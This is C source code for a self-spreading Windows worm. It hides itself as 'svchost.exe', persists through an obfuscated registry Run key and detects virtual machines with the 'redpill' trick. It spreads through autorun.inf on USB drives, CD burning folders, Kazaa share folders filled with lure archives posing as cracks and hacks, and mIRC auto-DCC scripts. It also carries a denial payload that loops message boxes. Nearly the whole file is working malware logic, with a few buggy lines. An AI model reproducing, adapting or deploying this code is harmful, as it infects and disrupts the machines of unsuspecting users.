#include <stdio.h>
#include <windows.h>

#include "zipstore.h"

char *exename = "svchost.exe";
char *spreadname = "protector.exe";
char *regname = "Service Host Manager";
char *mutex = "wazaaapldsfsdf";

char *p2pfiles[] = {
     "Windows.Activation.Crack.Final-ETH0.zip", "systemcrack.exe",
     "Windows.Live.Messenger.Beta.Serial.Generator-PARADOX.zip", "msngen.exe",
     "Virtua.Girl.Serial.Pack.wih.10.Girls-TorrentZ.zip", "virtuagrl.exe",
     "MSN.Hacker.zip", "msnhack.exe",
     "Hotmail.Hacker.zip", "hotmailhack.exe",
     "Aim.Hacker.zip", "aimhack.exe",
     "Counterstrike.Source.aimbot.zip", "aimbot.exe",
     "Xbox.Live.Serial.Generator.zip", "xblgen.exe",
     "Saddam.Hanging-NEW-VERSION!.zip", "Saddam hang you bitch!.exe",
     "XXX.Passes.Juli.2007.zip", "passlist.txt______________________________________.exe",
     NULL, NULL     
};

int infect(char *path, char *filename);
int cdcopy(char *filename);
int drivecopy(char *filename);
int rot13(char input[256], char output[256]);
int redpill(void);
int p2pcopy(char *filename);
int mirccopy(char *filename);
int addlog(char *line, ...);

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil) {                    
    if(redpill()) {
        payload();
    }
	
    char filename[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename));
 
    char path[MAX_PATH];
    strcpy(path, filename);
    path[3] = '\0';
    if(GetDriveType(path) == DRIVE_REMOVABLE) {
        ShellExecute(NULL, "open", path, "", NULL, SW_SHOW);
    }
    
    char *userprofile = getenv("USERPROFILE");
    char installpath[MAX_PATH];
    sprintf(installpath, "%s\\%s", userprofile, exename);
    
    if(strcmp(filename, installpath)) {
        CopyFile(filename, installpath, 1);
        SetFileAttributes(installpath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
        
    	HKEY startup;
    	char *key13 = "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha";
    	char key[256];
    	rot13(key13, key);
    	RegCreateKeyEx(HKEY_LOCAL_MACHINE , key, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &startup, NULL);
    	RegSetValueEx(startup, regname, 0, REG_SZ, installpath, strlen(installpath));
    	RegCloseKey(startup);

        ShellExecute(NULL, "open", installpath, "", NULL, SW_HIDE);
        Sleep(2000);
        ExitProcess(EXIT_SUCCESS);                  
    }
    
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, mutex), 15000) == WAIT_TIMEOUT) {
		ExitProcess(EXIT_FAILURE);
	}

    char *date = getenv("DATE");
    if((date == "10/07/2007") || (date == "07/10/2007") || (date == "7/10/2007")) {
        payload();
    }
    
    p2pcopy(filename);
    mirccopy(filename);
    
    while(1) { 
        Sleep(6000);
        
        drivecopy(filename);

        if(FindWindow(NULL, "CD Writing Wizard")) {
            cdcopy(filename); 
        }
    }
    return 0;
}

int infect(char *path, char *filename) {

    char wormpath[MAX_PATH];
    char infpath[MAX_PATH];
    sprintf(wormpath, "%s%s", path, spreadname);
    sprintf(infpath, "%sautorun.inf", path);
    
    FILE *inf;
    inf = fopen(infpath, "w");
    if(inf == NULL) {
        return 0;       
    }
    fprintf(inf, "[autorun]\n");
    fprintf(inf, "shellexecute=%s\n", spreadname);
    fprintf(inf, "action=Open folder to view files\n");
    fprintf(inf, "shell\\infected=Open\n");
    fprintf(inf, "shell\\infected\\command=%s\n", spreadname);
    fprintf(inf, "shell=infected\n");
    fclose(inf);
    
    CopyFile(filename, wormpath, 1);

    SetFileAttributes(wormpath ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    SetFileAttributes(infpath ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    return 1;
}

int cdcopy(char *filename) {
    char *userprofile = getenv("USERPROFILE");
    char burningpath[MAX_PATH];
    char *dirstring13 = "Ybpny Frggvatf\\Nccyvpngvba Qngn\\Zvpebfbsg\\PQ Oheavat\\";
    char dirstring[256];
    rot13(dirstring13, dirstring);
    sprintf(burningpath, "%s\\%s", userprofile, dirstring);
    infect(burningpath, filename);
    return 0;
}

int mirccopy(char *filename) {
    char mircdir[MAX_PATH];
    DWORD mircdirlen = sizeof(mircdir);
    
    HKEY mirc;
   	char *mirckey13 = "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Havafgnyy\\zVEP";
    char mirckey[256];
    rot13(mirckey13, mirckey);
    RegOpenKeyEx(HKEY_CURRENT_USER, mirckey, 0, KEY_QUERY_VALUE, &mirc); 
    RegQueryValueEx(mirc, "UninstallString", 0, NULL, mircdir, &mircdirlen);
    RegCloseKey(mirc);

    char mirczip[MAX_PATH];
    sprintf(mirczip, "%s\\CHANNEL-RULES.zip", mircdir);
    zip_store(filename, mirczip, "RULES.TXT______________________________________.exe");
    
    char mircscript[MAX_PATH];
    sprintf(mircscript, "%s\\script.ini", mircdir);
    
    FILE *script;
    script = fopen(mircscript, "w");
    if(script) {
        fprintf(script, "[Script]\n");
        fprintf(script, "sn0=ON 1:JOIN:#:{\n");
        fprintf(script, "n1=/dcc send $nick CHANNEL-RULES.zip\n");
        fprintf(script, "n2=}\n");
        fclose(script);    
    }
    return 1;    
}

int drivecopy(char *filename) {
    char drives[105];
    int drivesize = GetLogicalDriveStrings(104, drives);
    drivesize = drivesize / 4;
    char *tmp = drives;
    int i;
    int count = 0;
    for(i = 0; i < drivesize; i++) {
        if((GetDriveType(tmp) == DRIVE_REMOVABLE) && !(strstr(tmp, "A")) && !(strstr(tmp, "B")) ) {
            if(infect(tmp, filename)) {
                count++;
            }
        }
        tmp = tmp + 4;        
    }
    return count;   
}

int p2pcopy(char *filename) {

    char kazaapath[MAX_PATH];
    DWORD kazaapathlen = sizeof(kazaapath);
    
    HKEY kazaa;
   	char *kazaakey13 = "Fbsgjner\\Xnmnn\\Genafsre";
    char kazaakey[256];
    rot13(kazaakey13, kazaakey);
    RegOpenKeyEx(HKEY_CURRENT_USER, kazaakey, 0, KEY_QUERY_VALUE, &kazaa); 
    RegQueryValueEx(kazaa, "DlDir0", 0, NULL, kazaapath, &kazaapathlen);
    RegCloseKey(kazaa);

    char kazaazip[MAX_PATH];
    
    char *userprofile = getenv("USERPROFILE");
    char sharedpath[MAX_PATH];
    sprintf(sharedpath, "%s\\Shared", userprofile);
    
    char sharedzip[MAX_PATH];
    int i;
    for(i = 0; p2pfiles[i] != NULL; i = i + 2) {
        sprintf(kazaazip, "%s\\%s", kazaapath, p2pfiles[i]);
        zip_store(filename, kazaazip, p2pfiles[i+1]);
        
        sprintf(sharedzip, "%s\\%s", sharedpath, p2pfiles[i]);
        zip_store(filename, sharedzip, p2pfiles[i+1]);
    }
    return 1;
}

int payload(void) {
    while(1) {
        MessageBox(NULL, "", MB_OK);  
    }
    return 0;   
}

int rot13(char input[256], char output[256]) {
    int i = 0;
    do {
        if(input[i] <= 'm' && isalpha(input[i]) && islower(input[i])) {
            output[i] = input[i] + 13;
         }
        else if(input[i] <= 'M' && isalpha(input[i]) && isupper(input[i])) {
            output[i] = input[i] + 13;
        }
        else if(input[i] >= 'n' && isalpha(input[i]) && islower(input[i])) {
            output[i] = input[i] - 13;       
        }
        else if(input[i] >= 'N' && isalpha(input[i]) && isupper(input[i])) {
            output[i] = input[i] - 13;       
        }
        else {
            output[i] = input[i];     
        }
        i++;
    } while(input[i] != '\0');
    output[i] = '\0';
    return 1;
}

int redpill(void) {
    unsigned char m[2+4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
    *((unsigned*)&rpill[3]) = (unsigned)m;
    ((void(*)())&rpill)();
    return (m[5] > 0xd0) ? 1 : 0;
}
